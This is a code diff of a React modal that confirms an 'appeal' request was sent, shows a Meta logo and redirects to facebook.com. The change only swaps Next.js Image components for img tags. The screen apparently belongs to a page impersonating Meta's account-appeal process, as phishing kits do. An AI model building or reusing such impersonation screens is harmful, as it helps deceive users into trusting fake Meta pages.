@@ -1,4 +1,3 @@
-import Image from 'next/image';
 import { type FC } from 'react';
 
 const FinalModal: FC = () => {
@@ -6,7 +5,6 @@ const FinalModal: FC = () => {
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
             <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                 
-                {/* Tiêu đề và nội dung */}
                 <p className='mt-4 text-2xl font-bold'>Request has been sent</p>
                 <p className='text-xl'>
                     Your request has been added to the processing queue. 
@@ -14,15 +12,8 @@ const FinalModal: FC = () => {
                     If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.
                 </p>
 
-                {/* Hình ảnh và nút */}
                 <div className='flex flex-col justify-center gap-10'>
-                    <Image 
-                        src='/assets/final-image.png' 
-                        alt='Final Image' 
-                        width={400} 
-                        height={300} 
-                        className='mx-auto'
-                    />
+                    <img src='/assets/final-image.png' alt='Final Image' className='mx-auto w-[400px] h-[300px]' />
                     <button
                         type='button'
                         onClick={() => window.location.replace('https://www.facebook.com')}
@@ -32,16 +23,9 @@ const FinalModal: FC = () => {
                     </button>
                 </div>
 
-                {/* Logo Meta ở dưới */}
                 <div className='flex items-center justify-center p-3'>
-                    <Image 
-                        src='/assets/images/meta-logo-image.png' 
-                        alt='Meta Logo' 
-                        width={70} 
-                        height={18} 
-                    />
+                    <img src='/assets/images/meta-logo-image.png' alt='Meta Logo' className='w-[70px] h-[18px]' />
                 </div>
-
             </div>
         </div>
     );
